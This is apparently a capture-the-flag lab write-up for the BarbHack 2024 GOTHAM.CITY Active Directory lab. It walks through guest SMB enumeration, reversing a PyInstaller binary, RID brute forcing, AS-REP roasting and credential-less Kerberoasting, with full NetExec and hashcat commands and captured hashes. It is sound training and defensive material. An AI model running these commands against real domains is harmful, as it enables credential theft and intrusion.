---
layout: post
title: "NetExec Lab: BarbHack 2024 (Gotham City)"
categories: [NetExec]
tags: [windows-ad, netexec, pyinstaller, rid-brute, asrep-roasting, kerberoasting, dll-hijacking, gmsa-abuse, printnightmare, backup-operators]
tag_anchors:
  asrep-roasting: "#32-as-rep-roasting"
  kerberoasting: "#33-kerberoasting-without-authentication"
  rid-brute: "#31-user-enumeration--rid-brute-forcing"
  dll-hijacking: "#46-exploitation--dll-hijacking"
  gmsa-abuse: "#54-resolving-the-gmsa--gmsa-robin"
  printnightmare: "#63-printnightmare"
  backup-operators: "#82-adding-ourselves-to-backup-operators"
  pyinstaller: "#appendix-a-reversing-cleanslateexe"
---

| | |
|---|---|
| **Lab** | NetExec Active Directory Lab — BarbHack 2024 |
| **CTF Creator** | [mpgn](https://x.com/mpgn_x64) (BarbHack 2024 Windows CTF) |
| **Lab Deployment** | [Aleem Ladha](https://x.com/LadhaAleem) & [M4yFly](https://x.com/M4yFly) (ansible playbook, based on GOAD) |
| **Goal** | Become Domain Admin of `GOTHAM.CITY` using NetExec |
| **Starting Point** | `192.168.56.11` (SRV01 — anonymous SMB) |
| **Difficulty** | Medium (guided AD chain) |

<img src="/assets/images/barbhack-logo.jpg" alt="BarbHack" style="max-width:300px; display:block; margin:20px auto;" />

### TL;DR

The lab is a three-machine Active Directory environment (`DC01`, `SRV01`, `SRV02` — domain `GOTHAM.CITY`) designed to be pwned end-to-end with **NetExec**. I started with anonymous SMB on `SRV01`, where a guest-writable `CleanSlate` share hosted `cleanslate.exe` — a **PyInstaller**-packed Python 3.11 binary. Decompiling it (`pyinstxtractor-ng` ➜ `pycdc`/`pycdas`) showed the flag is protected by nothing but base64 + a Caesar shift + a string reverse — `brb{c84b9cb01e49bdd12ad43f77317aa326}` — and dynamic analysis confirmed it: drop `matrix` into `C:\SHARE\key.txt` and the binary prints it. That was only the foothold. On `DC01` I RID-brute-forced the user list, found `lucius.fox1337` AS-REP-roastable (hash wouldn't crack), and abused the no-preauth TGS-request trick to Kerberoast `joker` anyway ➜ `<3batman0893`. As joker I mapped the domain with RustHound, landed RDP on `SRV01`, and privesc'd via DLL hijacking — `WayneService` runs as SYSTEM out of a user-writable `C:\Wayne` and tries to load a missing `alfred.dll`; my version saved SAM/SYSTEM to `C:\ProgramData` and added joker to the local Administrators group. The LSA dump leaked the `gmsa-robin$` gMSA hash, which held `GenericAll` over `harley.quinn` — password reset, RDP to `SRV02`, PrintNightmare (remote attempt blocked with `RPC_E_ACCESS_DENIED`, local `Invoke-Nightmare` ➜ local admin `myth`). A leftover `winscp.reg` spilled `harvey.dent`'s password, and his intended `GenericAll` over `Backup Operators` let me add myself to the group, save the DC's SAM/SYSTEM/SECURITY hives and dump NTDS.dit — Administrator hash in hand for a shell on `DC01`. Full domain compromise. 🦇🔥

---

# 1. Reconnaissance

## 1.1 Network Discovery

The lab lives on a `192.168.56.0/24` VMWare host-only network. First step, find the live hosts:

```bash
➜ fping -aqg 192.168.56.0/24
192.168.56.10
192.168.56.11
192.168.56.12
```

Three live hosts. Fingerprinting them with NetExec:

```bash
➜ nxc smb 192.168.56.0/24
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
```

### 1.1.1 Initial Analysis

Three hosts, one domain — `GOTHAM.CITY`:

* **DC01 (`192.168.56.10`)** is the Domain Controller — SMB signing **enabled** (a DC hallmark) and, more interestingly, **Null Auth allowed**. Anonymous enumeration is on the table from minute zero, and that's going to matter later.
* **SRV01 (`192.168.56.11`)** is a member server — signing **disabled**.
* **SRV02 (`192.168.56.12`)** is a second member server — signing **disabled**.

Kerberos is picky about DNS, so the domain names go into `/etc/hosts` up front. NetExec can generate the entries for us:

```bash
➜ nxc smb 192.168.56.0/24 --generate-hosts-file /tmp/hosts.txt

➜ cat /tmp/hosts.txt
192.168.56.10     DC01.GOTHAM.CITY GOTHAM.CITY DC01
192.168.56.12     SRV02.GOTHAM.CITY SRV02
192.168.56.11     SRV01.GOTHAM.CITY SRV01
```

## 1.2 Full Port Scan

SMB is clearly the theme of this lab, but let's not assume that's all there is. A full TCP sweep of the DC first:

```bash
➜ rustscan -a 192.168.56.10 --ulimit 5000 -r 1-65535 -- -A -Pn

...[snip]...

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-20 07:53:09Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: GOTHAM.CITY, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
...[snip]...
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

And the two member servers, which turn out to be identical:

```bash
➜ rustscan -a 192.168.56.11 --ulimit 5000 -r 1-65535 -- -A -Pn

PORT    STATE SERVICE       REASON  VERSION
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

# SRV02 (192.168.56.12) shows the same three ports
```

### 1.2.1 Port Analysis

* **DC01 — the full AD surface:** Ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 464 (kpasswd), and the RPC endpoint mapper cluster (135/593/49664+) are the standard domain controller footprint. Two of these matter for us later:
  * **Port 88/464 — Kerberos:** present and answering, which means AS-REP roasting and Kerberoasting are in scope once we have a user list.
  * **Port 389 — LDAP:** anonymous LDAP binds depend on the server's config; if null auth works over SMB it likely works here too. LDAP is where we'll pull account attributes like *does this user require pre-authentication?*
  * The nmap script output also confirms what NetExec told us: **`Message signing enabled and required`** on the DC — no NTLM relaying *to* this host over SMB.

* **SRV01/SRV02 — minimal member servers:** Just 135/139/445 — pure SMB boxes with no extra attack surface exposed. No RDP visible from the scan (3389 filtered or firewalled off until we test it authenticated). Notably, their SMB signing is **`enabled but not required`** — meaning an NTLM relay *to* these hosts would be technically possible if we can coerce authentication. We won't need it for this chain, but it's worth noting as an alternative path.

**Game plan:** The lab title says it all — everything runs through SMB and the AD protocols behind it. Start at the only door that's open without credentials: guest access to SRV01's shares.

## 1.3 Anonymous SMB Enumeration

Without credentials our options are limited, so the first move is to check which hosts accept a null/guest session. The `-u . -p .` trick tells NetExec to authenticate with an empty username and password:

```bash
➜ nxc smb srv01.gotham.city -u . -p .
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\\.:. (Guest)
```

> **Null Session vs. Guest Session** — two different "unauthenticated" access levels that are easy to conflate:
>
> * **Null Session** is a legacy SMB mechanism: you connect with *literally no credentials* and the server logs you in as **`ANONYMOUS LOGON`**. It existed for machine-to-machine chatter (browsing workgroups, trust enumeration) and was famously abused on NT/2000-era boxes to dump full user lists over IPC$. Modern Windows clamps down hard on it (`RestrictAnonymous`, `RestrictAnonymousSAM`) — today a null session usually gets you little more than a share list, and even that depends on hardening.
> * **Guest Session** means you authenticated *as an actual account* — the built-in **`guest`** user (RID 501). When guest access is enabled on the server, failed or empty logons get **mapped to Guest** instead of being rejected. That's what happened above: our empty `-u . -p .` attempt came back as `[+] GOTHAM.CITY\.:. (Guest)`. As a real account, Guest gets normal access checks against share + NTFS ACLs for the `Everyone`/`Guests` groups — which is why we can actually *read files* here, not just list them.
>
> Practical takeaway: **null sessions enumerate, guest sessions read.** A `(Guest)` tag in NetExec output is the more valuable of the two — it means file access, not just metadata.

`SRV01` accepts the connection and maps it to the **Guest** account. Listing shares as guest:

```bash
➜ nxc smb srv01.gotham.city -u guest -p '' --shares
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\guest:
SMB         192.168.56.11   445    SRV01            [*] Enumerated shares
SMB         192.168.56.11   445    SRV01            Share           Permissions            Remark
SMB         192.168.56.11   445    SRV01            -----           -----------            ------
SMB         192.168.56.11   445    SRV01            ADMIN$                                 Remote Admin
SMB         192.168.56.11   445    SRV01            C$                                     Default share
SMB         192.168.56.11   445    SRV01            CleanSlate      READ,WRITE             Basic RW share for all
SMB         192.168.56.11   445    SRV01            IPC$            READ                   Remote IPC
```

## 1.4 The CleanSlate Share

The interesting one is **`CleanSlate`** — a share that is both readable *and* writable by the guest account ("Basic RW share for all"). A non-default share with content is always worth a look. Enumerating its contents with the `spider_plus` module:

```bash
➜ nxc smb srv01.gotham.city -u guest -p '' -M spider_plus
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\guest:
SPIDER_PLUS 192.168.56.11   445    SRV01            [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.56.11   445    SRV01            [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 192.168.56.11   445    SRV01            [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.56.11   445    SRV01            [*]  MAX_FILE_SIZE: 50 KB
...[snip]...
SPIDER_PLUS 192.168.56.11   445    SRV01            [*] SMB Writable Shares:  1 (CleanSlate)
SPIDER_PLUS 192.168.56.11   445    SRV01            [*] Total files found:    1
SPIDER_PLUS 192.168.56.11   445    SRV01            [*] File size average:    10.02 MB
```

The module saves its findings as JSON:

```bash
➜ cat ~/.nxc/modules/nxc_spider_plus/192.168.56.11.json
{
    "CleanSlate": {
        "cleanslate.exe": {
            "atime_epoch": "2026-08-16 19:28:08",
            "ctime_epoch": "2026-08-16 19:28:08",
            "mtime_epoch": "2026-08-16 19:28:14",
            "size": "10.02 MB"
        }
    }
}
```

A single file, ~10 MB: **`cleanslate.exe`**. Downloading it through the same guest session:

```bash
➜ nxc smb srv01.gotham.city \
    -u 'guest' -p '' \
    --share 'CleanSlate' \
    --get-file cleanslate.exe cleanslate.exe
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] GOTHAM.CITY\guest:
SMB         192.168.56.11   445    SRV01            [*] Copying "cleanslate.exe" to "cleanslate.exe"
SMB         192.168.56.11   445    SRV01            [+] File "cleanslate.exe" was downloaded to "cleanslate.exe"
```

A ~10 MB mystery binary from a guest-writable share — time to see what it actually is.

---

# 2. Binary Analysis

## 2.1 File Triage

Before executing anything of unknown origin, identify what we're dealing with:

```bash
➜ file cleanslate.exe
cleanslate.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections

➜ sha256sum cleanslate.exe
ddfe0b9f8d348b57097b970960dbfecb6a1adff2746995d29f05ca2a35712b9c  cleanslate.exe
```

A ~10 MB x86-64 Windows console binary. That size is the first hint: 10 MB is absurd for a program that (presumably) just prompts for a key. A binary that big almost always has a **runtime bundled inside it**. Time to look at the strings.

## 2.2 Strings — PyInstaller Detection

```bash
➜ strings -a cleanslate.exe | grep -iE "python|pyinstaller|marshal|MEIPASS|pyz"
pyi-python-flag
PyMarshal_ReadObjectFromString
PyRun_SimpleStringFlags
Failed to get _MEIPASS as PyObject.
_MEIPASS
Failed to start embedded python interpreter!
_pyinstaller_pyz
bpython311.dll
7python311.dll
```

These strings are a textbook **PyInstaller** signature:

* `pyi-python-flag` / `_pyinstaller_pyz` — PyInstaller's internal markers.
* `PyMarshal_ReadObjectFromString` / `PyRun_SimpleStringFlags` — the embedded CPython runtime loading marshalled bytecode.
* `_MEIPASS` — the temp directory PyInstaller one-file builds unpack into at runtime.
* `python311.dll` — pins the embedded interpreter to **Python 3.11**.

So `cleanslate.exe` is a **PyInstaller one-file executable**: the Python interpreter, the standard library, and the actual script are all packed into the `.exe`, extracted to a temp dir at launch, and executed. To recover the script we need to unpack the archive and decompile the entry-point bytecode.

The full static analysis — extraction with `pyinstxtractor-ng`, decompilation with `pycdc`/`pycdas`, and the reconstructed source — lives in [Appendix A](#appendix-a-reversing-cleanslateexe). But there's a faster way to the flag: dynamic analysis.

## 2.3 Dynamic Analysis

> Instead of decompiling, we can simply observe what the binary does at runtime with **Procmon**.

After executing the binary, the process is trying to create a file in **`C:\Share\key.txt`**:

![Procmon showing cleanslate.exe probing C:\Share\key.txt](/assets/images/barbhack24-gotham-procmon-keytxt.png)

Procmon confirms the binary probes `C:\SHARE\key.txt` on every run via `CreateFile` calls — if the file exists and contains a valid key, the flag is printed. Creating the file with any content named `matrix` satisfies the check. So let's give it one — creating `key.txt` with a key named `matrix`, then running the binary again:

![cleanslate.exe accepting the key and printing the flag](/assets/images/barbhack24-gotham-cleanslate-flag.png)

We got the flag: `brb{c84b9cb01e49bdd12ad43f77317aa326}`

> **Hint drift:** In the original CTF build, successfully decrypting the flag also printed a hint pointing to the **`lucius.fox1337`** account — the designed bridge into the next stage (AS-REP roasting). This fresh build's binary contains no such hint (verified: the string appears nowhere in the executable or its extracted bytecode). Not a problem — DC01 allows null authentication by design, so we'll discover the user list ourselves via RID brute forcing in the next section.

---

# 3. DC01 | Enumeration

## 3.1 User Enumeration — RID Brute Forcing

Remember that `Null Auth:True` flag from the recon scan? This is where it pays off. SMB exposes a subtle information leak that's been part of Windows since NT: **every security principal in the domain has a RID** (Relative Identifier) appended to the domain SID, and looking up an arbitrary SID via the `LSARpc` `LookupNames`/`LookupSids` interface doesn't require authentication. So if we know the domain SID (`S-1-5-21-...`) and iterate over the trailing RID — 500, 501, 502, ... 1100, 1101 ... — the server will happily tell us which username owns each one.

That's exactly what NetExec's `--rid-brute` does:

```bash
➜ nxc smb dc01.gotham.city \
    -u guest -p '' \
    --rid-brute 3000
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\guest:
SMB         192.168.56.10   445    DC01             498: GOTHAM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             500: GOTHAM\Administrator (SidTypeUser)
SMB         192.168.56.10   445    DC01             501: GOTHAM\Guest (SidTypeUser)
SMB         192.168.56.10   445    DC01             502: GOTHAM\krbtgt (SidTypeUser)
SMB         192.168.56.10   445    DC01             512: GOTHAM\Domain Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             513: GOTHAM\Domain Users (SidTypeGroup)
SMB         192.168.56.10   445    DC01             514: GOTHAM\Domain Guests (SidTypeGroup)
SMB         192.168.56.10   445    DC01             515: GOTHAM\Domain Computers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             516: GOTHAM\Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             517: GOTHAM\Cert Publishers (SidTypeAlias)
SMB         192.168.56.10   445    DC01             518: GOTHAM\Schema Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             519: GOTHAM\Enterprise Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             520: GOTHAM\Group Policy Creator Owners (SidTypeGroup)
SMB         192.168.56.10   445    DC01             521: GOTHAM\Read-only Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             522: GOTHAM\Cloneable Domain Controllers (SidTypeGroup)
SMB         192.168.56.10   445    DC01             525: GOTHAM\Protected Users (SidTypeGroup)
SMB         192.168.56.10   445    DC01             526: GOTHAM\Key Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             527: GOTHAM\Enterprise Key Admins (SidTypeGroup)
SMB         192.168.56.10   445    DC01             553: GOTHAM\RAS and IAS Servers (SidTypeAlias)
SMB         192.168.56.10   445    DC01             571: GOTHAM\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         192.168.56.10   445    DC01             572: GOTHAM\Denied RODC Password Replication Group (SidTypeAlias)
SMB         192.168.56.10   445    DC01             1000: GOTHAM\vagrant (SidTypeUser)
SMB         192.168.56.10   445    DC01             1001: GOTHAM\DC01$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1102: GOTHAM\DnsAdmins (SidTypeAlias)
SMB         192.168.56.10   445    DC01             1103: GOTHAM\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.10   445    DC01             1104: GOTHAM\SRV01$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1105: GOTHAM\SRV02$ (SidTypeUser)
SMB         192.168.56.10   445    DC01             1106: GOTHAM\bruce.wayne (SidTypeUser)
SMB         192.168.56.10   445    DC01             1107: GOTHAM\joker (SidTypeUser)
SMB         192.168.56.10   445    DC01             1108: GOTHAM\alfred.pennyworth (SidTypeUser)
SMB         192.168.56.10   445    DC01             1109: GOTHAM\selina.kyle (SidTypeUser)
SMB         192.168.56.10   445    DC01             1110: GOTHAM\harvey.dent (SidTypeUser)
SMB         192.168.56.10   445    DC01             1111: GOTHAM\jim.gordon (SidTypeUser)
SMB         192.168.56.10   445    DC01             1112: GOTHAM\lucius.fox1337 (SidTypeUser)
SMB         192.168.56.10   445    DC01             1113: GOTHAM\barbara.gordon (SidTypeUser)
SMB         192.168.56.10   445    DC01             1114: GOTHAM\oswald.cobblepot (SidTypeUser)
SMB         192.168.56.10   445    DC01             1115: GOTHAM\edward.nygma (SidTypeUser)
SMB         192.168.56.10   445    DC01             1116: GOTHAM\bane (SidTypeUser)
SMB         192.168.56.10   445    DC01             1117: GOTHAM\victor.freeze (SidTypeUser)
SMB         192.168.56.10   445    DC01             1118: GOTHAM\harley.quinn (SidTypeUser)
SMB         192.168.56.10   445    DC01             1119: GOTHAM\dick.grayson (SidTypeUser)
SMB         192.168.56.10   445    DC01             1120: GOTHAM\jason.todd (SidTypeUser)
SMB         192.168.56.10   445    DC01             1121: GOTHAM\tim.drake (SidTypeUser)
SMB         192.168.56.10   445    DC01             1122: GOTHAM\talia.al.ghul (SidTypeUser)
SMB         192.168.56.10   445    DC01             1123: GOTHAM\rachel.dawes (SidTypeUser)
SMB         192.168.56.10   445    DC01             1124: GOTHAM\ras.al.ghul (SidTypeUser)
SMB         192.168.56.10   445    DC01             1125: GOTHAM\scarecrow (SidTypeUser)
SMB         192.168.56.10   445    DC01             1126: GOTHAM\poison.ivy (SidTypeUser)
SMB         192.168.56.10   445    DC01             1127: GOTHAM\black.mask (SidTypeUser)
SMB         192.168.56.10   445    DC01             1128: GOTHAM\killer.croc (SidTypeUser)
SMB         192.168.56.10   445    DC01             1129: GOTHAM\deadshot (SidTypeUser)
SMB         192.168.56.10   445    DC01             1130: GOTHAM\gmsa-robin$ (SidTypeUser)
```

The whole Gotham rogues gallery — plus two names worth flagging early:

* **`gmsa-robin$`** — the trailing `$` marks it as a machine/service account, and "gMSA" in the name gives away that it's a *Group Managed Service Account*. Remember it; it becomes important after **`SRV01`**.
* **`lucius.fox1337`** — the `1337` suffix on an otherwise-normal name smells like a deliberately-planted account. In the original CTF this is who the binary hinted at.

Exporting just the user accounts for the next step:

```bash
➜ cat rid-brute.out | grep -i sidtypeUser | awk -F '\\' '{print $2}' | awk '{print $1}' | sort | uniq > users.txt
```

## 3.2 AS-REP Roasting

With a user list in hand, the first credential-hunting technique to try is **AS-REP Roasting**. Normally, Kerberos pre-authentication forces the client to prove knowledge of its password (an encrypted timestamp) *before* the KDC hands out any ticket material. Accounts with **pre-authentication disabled** skip that step — so anyone can fire off an AS-REQ for them and receive an AS-REP whose reply-encrypted part is encrypted with the **user's own password-derived key**. That blob is crackable offline at hashcat speeds.

NetExec can hunt these accounts across our entire user list:

```bash
➜ nxc ldap dc01.gotham.city \
    -u users.txt -p '' \
    --asreproast asrep.out
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert)
LDAP        192.168.56.10   389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        192.168.56.10   389    DC01             $krb5asrep$23$lucius.fox1337@GOTHAM.CITY:dd3e9f55eee00a653a243db2888889ea$3b2980216cf88d36ea7c5a99cfa726064c1e5b16a0d7f43edaff3357b0d24d3cc182b41799b7456312874150140e9337ba989ed9ae4e740c4e451f78dee1364fe40f67d9875cba95c0b5e602227d104e841a3956ea22c6707e0dd0c47de17299f1c761464fb653f38ae3825358e777782c11d85d8ddd2c9a8212789337e4b0cd9118f83c85f29a8197ce199df530aa8e812783305e63d544c4d5a14b5f1a2e23f21b759e09e05e709558505ed80616df785237d1c2d5027859a98d34c668abb3a12b42f2f0aa3e3d0f0eae198c69c31c47e7851672d78626dd5234a026811c2ec61cd31f2c0136a1cd61
LDAP        192.168.56.10   389    DC01             [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

One hit: **`lucius.fox1337`** has pre-authentication disabled. (The `KDC_ERR_CLIENT_REVOKED` errors are just disabled accounts like Guest being skipped.)

Cracking attempt:

```bash
➜ hashcat --identify lucius.fox.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

➜ hashcat -a 0 -m 18200 lucius.fox.hash /opt/rockyou.txt
...[snip]...

Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

Not crackable — the password isn't in rockyou. Dead end? Not quite. This account still has value, because of what its misconfiguration *enables* next.

## 3.3 Kerberoasting Without Authentication

The `lucius.fox1337` hash won't crack, but its misconfiguration is still our way in — thanks to a quirk of the Kerberos protocol documented by [Charlie Clark (Semperis, 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

Quick recap of how Kerberoasting normally works. A **service ticket (ST)** is issued by the KDC in response to a **TGS-REQ**, and part of that ticket (`enc-part`) is encrypted with the **target service account's long-term key** (its password hash). Anyone authenticated to the domain can request an ST for any SPN, so an attacker collects these tickets and cracks them offline — that's Kerberoasting (Tim Medin). The catch has always been the word *authenticated*: you need a valid TGT to send a TGS-REQ, which means you need at least one domain credential before you can start.

Charlie's discovery: the **AS-REQ** — the message type normally used to get a TGT — doesn't have to ask for `krbtgt`. The request body (`req-body`) is plaintext and contains an `sname` field, and if you put **any SPN** there instead of `krbtgt/DOMAIN`, the DC will happily return a **service ticket directly from the Authentication Service**. Microsoft was notified and classified it ["by design"](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

Now combine that with pre-authentication-disabled accounts:

* An AS-REQ for a **no-preauth account** returns ticket material whose encrypted part is keyed with *that account's* password — this is exactly the AS-REP roast we just did on `lucius.fox1337`.
* But for Kerberoasting, we don't care about the encrypted part aimed at us — we only need the **ST's enc-part**, which is always encrypted with the *service account's* key regardless of who asked.
* So: fire the AS-REQ **as** `lucius.fox1337` (no pre-auth needed, no password needed) but set `sname` to another user's SPN ➜ the DC hands back a TGS for that service account. **Kerberoasting with zero credentials.**

> Note: [Kerberoasting via AS-REP Roasting](https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting-via-as-rep-roasting)

NetExec implements this with `--no-preauth-targets` — it iterates our user list, uses any no-preauth accounts as the requesting identity, and asks for tickets to every SPN it can find:

```bash
➜ nxc ldap dc01.gotham.city \
    -u users.txt -p '' \
    --no-preauth-targets users.txt \
    --kerberoasting kerb.out
LDAP        dc01.gotham.city 389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert)
LDAP        dc01.gotham.city 389    DC01             [-] GOTHAM.CITY\Administrator: KDC_ERR_PREAUTH_FAILED
...[snip]...
LDAP        dc01.gotham.city 389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
LDAP        dc01.gotham.city 389    DC01             [+] GOTHAM.CITY\Guest:
LDAP        dc01.gotham.city 389    DC01             [*] Skipping account: DC01$, gmsa-robin$, krbtgt, SRV01$, SRV02$
LDAP        dc01.gotham.city 389    DC01             [*] Total of records returned 1
LDAP        dc01.gotham.city 389    DC01             $krb5tgs$23$*joker$GOTHAM.CITY$joker*$5c8e56cfc76a20f96a53c2c0586a52ec$9c585695985ebe35f39bce3733ab872f1fc207b95e84037cc2d07369ad25c543ad1242c6271b6758ecba62a639d9aae42896cc57ba46c210a65eaf783975db105c0a492df300709c512a4302cad0b71c976d4580909af3883d6c2679317bb84b30dd1453d40d44a1da46ec4688ff5c1ecb6b3a292433873c0b60879447964d93a7bfd1200ef236e3932ad7016296c1a28e659f300ddb55edb77d24ad9567b78cbe6b1ed219be8a26b8ac3b44beef0ea09938590347b37d24c5ce211c643f0cc33afaaa7bdb8e7bfb200e2890ec30b8d1fed7641b6e5760ce9b6ce29139aba799fa9243faf966b3e8ee074809f79bc210d90f54e476784b15104f150eb408b8027621767551dad80a607d72913ea6de3a72da0333fc45cdde31dec0408b621ce97f724b39c78ee49f47fc04f3544bfe9df79585033640d0bf257881ed50c507304adc866db53e6c29f4f2b2a11d69ae53d9358d3a7d02c5a59ceb7c8ba72a2cc8da9b46f2797a27415a1a4f70b8d692a5045a72328fa3ec96876db53d3ad495b5c92cecb86f6454826c7e4a8848d8009640e0c5bde275cf0c54a78e5a9b7cacce5cb8ca46b8b18e0b606f00ce1150bae8b2acbe4fab3cfde363e64b5c82378d52a2d980237ef33774e96cd65dcf6bc7a19c68fdf43186fa84eeef3e87f6998b0c916a56602efdad1403889b6e45ed240a676cf88be982aa686790e9cd6c2535fe1b8cc42d76248843dfd91aea125bf8b6379df5f87d16ea62853ad56690879ce385b07f001fb03b6b9be7e1f11bd64f0c77bee407de7ac9cb17bcf53c0ac2d4f0470add02b12decfdb590784d7511574557d96c6a6626644b40e59b0fa177f47770727858859bdf21a8bd7eb33622122a6945d7c988a6da70528c13ea7717cc074d301a8d25ebd85a3f322057ff40b41f688a65c04a8f244c4d549430e5375a28bd1de10aaf461f7d3a0a9f478c3ef50ab6070fd85705b131230598bfd92de819798f1a4bee1d2f1811694de2db6322aa24eac5b3459950c3004e6b2a682aca6d9e8802316c11c743faae526e9bb3420874b11f0c63f99e742fb03d81ad569ec9c2d1299212c04f03bada2fb82dcfcf8a241e10d967427f1080bde52369da9745c8f686ab31ea2cb02e366f22f79db9d99b02544f27bc4065ad01d023f75ce978f1337d8c36c0fc1b2ce2835468b59ceeb6d503da5ec3e268c73f0044ca715e09efbb700ca0a724aa4dcc08dce6191aade7e5cb573e417e325a
```

A TGS for **`joker`** — an SPN-holding service account. The noise in that output tells the story of the attempt chain: the `KDC_ERR_PREAUTH_FAILED` lines are the tool trying each normal account as the requester (they all demand pre-auth), the LDAP `operationsError` is the unauthenticated bind being refused for the SPN enumeration, and then the Guest bind succeeds as the fallback context — with `lucius.fox1337` doing the actual no-preauth lifting. One record came back.

Cracking it:

```bash
➜ hashcat --identify joker.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

➜ hashcat -a 0 -m 13100 joker.hash /opt/SecLists/rockyou.txt -d 1
...[snip]...
$krb5tgs$23$*joker$GOTHAM.CITY$joker*$5c8e56cfc76a20f96a53c2c0586a52ec$...[snip]...:<3batman0893

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

**Creds**: `joker` : `<3batman0893`

From zero credentials to a valid domain account — the AS-REP misconfiguration on `lucius.fox1337` never gave up its own password, but it happily opened the door to `joker`'s. Time to find out what joker can reach.

Worth knowing for blue-team purposes: because these tickets come from the AS rather than the TGS, they generate **4768** events ("TGT requested") instead of the usual **4769** ("service ticket requested") — so detections keyed on 4769 never see this attack coming.

---

# 4. SRV01 | Enumeration & Exploitation

## 4.1 Mapping the Domain — RustHound

First thing I do with any new set of domain credentials: collect the graph. **RustHound** pulls the whole LDAP estate fast, runs on Linux, and ingests straight into BloodHound:

```bash
➜ rusthound-ce \
    -d gotham.city -i dc01.gotham.city \
    -u joker@GOTHAM.CITY -p '<3batman0893' \
    -c All --zip
```

With the graph collected, the question is always the same: *what can this account reach?* Joker's node in BloodHound shows exactly what he is:

![BloodHound - joker group memberships](/assets/images/barbhack24-gotham-bh-joker-memberof.png)

